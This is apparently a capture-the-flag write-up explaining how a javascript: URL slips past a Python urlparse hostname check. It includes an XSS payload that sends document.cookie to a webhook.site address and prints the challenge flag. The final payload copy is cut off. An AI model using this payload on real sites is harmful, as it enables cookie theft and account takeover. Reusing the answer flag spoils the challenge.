# SpotiVibe 1

Now that Spotify has made their app uncrackable i decided to build my own personal version with the help of good old AI. It’s all so fantastic!!!

{% file src="../../../.gitbook/assets/spotivibe1.zip" %}

***

### Vulnerability Analysis

#### 1. URL Validation Logic

The application validates user input using Python:

```
decoded = unquote(url)
parsed = urlparse(decoded)

if parsed.hostname != "open.spotify.com":
    return False

if not parsed.path.startswith("/embed/"):
    return False

if '"' in decoded:
    return False
```

#### 🚨 Key Issue

The application **trusts Python’s `urlparse()`**, but the browser interprets URLs differently.

This creates a **parsing mismatch vulnerability**.

***

### Exploitation Technique

#### 🔑 Core Idea

Use a `javascript:` URL that:

* Passes Python validation
* Executes JavaScript in the browser

***

### Why the Payload Works

#### Payload Used

```
javascript://open.spotify.com/embed/%0alocation='https://webhook.site/YOUR-ID?c='+document.cookie
```

***

#### Step-by-Step Breakdown

**1. Python Interpretation (Server-Side)**

```
javascript://open.spotify.com/embed/...
```

Python parses this as:

* `scheme = javascript`
* `hostname = open.spotify.com` ✅
* `path = /embed/...` ✅

➡ **Validation passes successfully**

***

**2. Browser Interpretation (Client-Side)**

The browser sees:

```
javascript://open.spotify.com/embed/%0a...
```

Breakdown:

* `javascript:` → Execute as JavaScript
* `//open.spotify.com/...` → Treated as a **comment**
* `%0a` → Newline → Ends the comment

➡ Executed JavaScript:

```
location='https://webhook.site/YOUR-ID?c='+document.cookie
```

***

### 🍪 Cookie Exfiltration

The admin bot sets the flag cookie as:

```
await page.setCookie({
    "name": "flag",
    "value": FLAG,
    "httpOnly": False
})
```

#### Important Point

* `httpOnly = False`
* → JavaScript can access it via `document.cookie`

***

### Exploit Flow

1. Attacker submits malicious Spotify URL
2. Attacker reports the song
3. Admin bot:
   * Logs in
   * Sets flag cookie
   * Visits the song page
4. Malicious JavaScript executes
5. Browser redirects to webhook with cookie
6. Attacker captures the flag

***

### 🧪 Final Payload

```
javascript://open.spotify.com/embed/%0alocation='https://webhook.site/YOUR-ID?c='+document.
```

***

Let's Start <br>

First Create The Account !!

<figure><img src="../../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

Then We Add The Song Using Our Final Payload !!

<figure><img src="../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

Report The Admin !!

<figure><img src="../../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>

Check The WebHook Website and We Got The Flag !!

<figure><img src="../../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

```
Flag : KSUS{4b4eba6646f7903fd437d6fbf1b5783d}
```

